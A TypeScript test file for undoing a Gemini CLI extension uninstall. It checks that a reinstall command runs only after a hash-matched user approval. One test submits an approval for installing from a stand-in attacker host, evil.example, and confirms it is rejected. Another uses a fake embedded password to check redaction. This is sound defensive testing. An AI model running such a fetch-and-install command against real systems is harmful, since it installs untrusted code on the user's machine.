// Undoing an extension uninstall: the install record is backed up first, and putting it back reinstalls the
// extension from its recorded source with `gemini extensions install`, only after the user approves that command.
import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { test } from 'node:test'
import type { Action, ActionResult } from '../../adapters/view.ts'
import type { CliResult } from '../../core/ports.ts'
import { act, BACKUPS, files, GEMINI, itemOf, json, machine, viewOf } from './test-support.ts'

type Machine = ReturnType<typeof machine>

const INSTALL = `${GEMINI}/extensions/obsidian/.gemini-extension-install.json`
const sha = (text: string) => createHash('sha256').update(text).digest('hex')

/** A machine whose gemini double deletes the extension on uninstall and writes it back on install. */
function withCli(fixture = files(), install: (m: Machine, argv: readonly string[]) => CliResult | void = () => undefined) {
  const box: { m?: Machine } = {}
  const original = { ...fixture }
  box.m = machine({
    files: fixture,
    reply: (_command, argv) => {
      const m = box.m!
      if (argv[1] === 'uninstall') {
        for (const path of Object.keys(m.fs.files)) if (path.startsWith(`${GEMINI}/extensions/obsidian/`)) delete m.fs.files[path]
      }
      if (argv[1] === 'install') {
        const answer = install(m, argv)
        if (answer) return answer
        for (const [path, text] of Object.entries(original)) if (path.startsWith(`${GEMINI}/extensions/obsidian/`)) m.fs.files[path] = text
      }
      return { ok: true, output: 'done' }
    }
  })
  return box.m
}

async function uninstall(m: Machine) {
  const view = await viewOf(m.deps)
  return act(m.deps, { type: 'uninstall', key: itemOf(view, 'plugins', 'obsidian').key }, view.versions)
}

const undoOf = (result: ActionResult) => (result.ok ? result.undo : undefined)

test('L-A: an uninstall backs up the extension install record first, and its undo is a restore of that backup', async () => {
  const record = files()[INSTALL]
  let backedUp = false
  const m = withCli()
  const reply = m.exec.run.bind(m.exec)
  m.exec.run = async (command, argv, cwd, options) => {
    backedUp = Object.entries(m.fs.files).some(([path, text]) => path.startsWith(`${BACKUPS}/`) && text === record)
    return reply(command, argv, cwd, options)
  }
  const answer = await uninstall(m)
  assert.equal(answer.result.ok, true, answer.result.message)
  assert.equal(backedUp, true, 'the record was backed up before the CLI ran')
  const undo = undoOf(answer.result)
  assert.equal(undo?.type, 'restore')
  const name = (undo as { name: string }).name
  assert.equal(m.fs.files[`${BACKUPS}/${name}`], record, 'the undo names the backup of the install record')
})

test('L-A: the restore runs nothing and answers with the install command to approve, with --consent', async () => {
  const m = withCli()
  const undo = undoOf((await uninstall(m)).result) as Action & { type: 'restore' }
  m.exec.calls.length = 0
  const answer = await act(m.deps, undo)
  const command = 'gemini extensions install https://github.com/someone/gemini-obsidian --consent'
  assert.deepEqual(m.exec.calls, [], 'nothing ran before the approval')
  assert.equal(answer.result.ok, false)
  const result = answer.result as ActionResult & { ok: false }
  assert.equal(result.reason, 'needs-confirmation')
  assert.deepEqual(result.confirm, { command, action: { type: 'restore', name: undo.name, acceptCommand: sha(command) } })
})

test('L-A: the recorded ref, auto-update and pre-release go into the command', async () => {
  const fixture = files()
  fixture[INSTALL] = json({ source: 'https://github.com/someone/gemini-obsidian', type: 'git', ref: 'v2', autoUpdate: true, allowPreRelease: true })
  const m = withCli(fixture)
  const undo = undoOf((await uninstall(m)).result) as Action & { type: 'restore' }
  const answer = await act(m.deps, undo)
  assert.equal(
    (answer.result as ActionResult & { ok: false }).confirm?.command,
    'gemini extensions install https://github.com/someone/gemini-obsidian --ref v2 --auto-update --pre-release --consent'
  )
})

test('L-A: only the approved restore runs the install with --consent, and the extension is back', async () => {
  const m = withCli()
  const undo = undoOf((await uninstall(m)).result) as Action & { type: 'restore' }
  const asked = (await act(m.deps, undo)).result as ActionResult & { ok: false }
  m.exec.calls.length = 0

  const wrong = await act(m.deps, { ...undo, acceptCommand: sha('gemini extensions install https://evil.example --consent') })
  assert.equal(wrong.result.ok, false)
  assert.equal((wrong.result as ActionResult & { ok: false }).reason, 'needs-confirmation')
  assert.deepEqual(m.exec.calls, [], 'a mismatched approval runs nothing')

  const approved = await act(m.deps, asked.confirm!.action)
  assert.equal(approved.result.ok, true, approved.result.message)
  assert.deepEqual(m.exec.calls, ['gemini extensions install https://github.com/someone/gemini-obsidian --consent @ -'])
  assert.ok(m.fs.files[INSTALL], 'the extension is installed again')
  assert.ok(approved.view.ok && approved.view.view.items.some((item) => item.kind === 'plugins' && item.name === 'obsidian'))
})

test('L-A: a failed reinstall is reported with the command to run by hand', async () => {
  const m = withCli(files(), () => ({ ok: false, output: 'clone failed' }))
  const undo = undoOf((await uninstall(m)).result) as Action & { type: 'restore' }
  const asked = (await act(m.deps, undo)).result as ActionResult & { ok: false }
  const failed = await act(m.deps, asked.confirm!.action)
  assert.equal(failed.result.ok, false)
  assert.match(failed.result.message, /clone failed/)
})

test('L-A: a linked extension, or one whose source holds a secret, has no reinstall undo', async () => {
  const linked = files()
  linked[INSTALL] = json({ source: '/src/obsidian', type: 'link' })
  linked['/src/obsidian/gemini-extension.json'] = json({ name: 'obsidian', version: '1.1.0' })
  const m = withCli(linked)
  const answer = await uninstall(m)
  assert.equal(answer.result.ok, true, answer.result.message)
  assert.equal(undoOf(answer.result), undefined)

  const secret = files()
  secret[INSTALL] = json({ source: 'https://user:hunter2@example.com/obsidian.git', type: 'git' })
  const s = withCli(secret)
  const withSecret = await uninstall(s)
  assert.equal(undoOf(withSecret.result), undefined)
  assert.doesNotMatch(withSecret.result.message, /hunter2/)
})
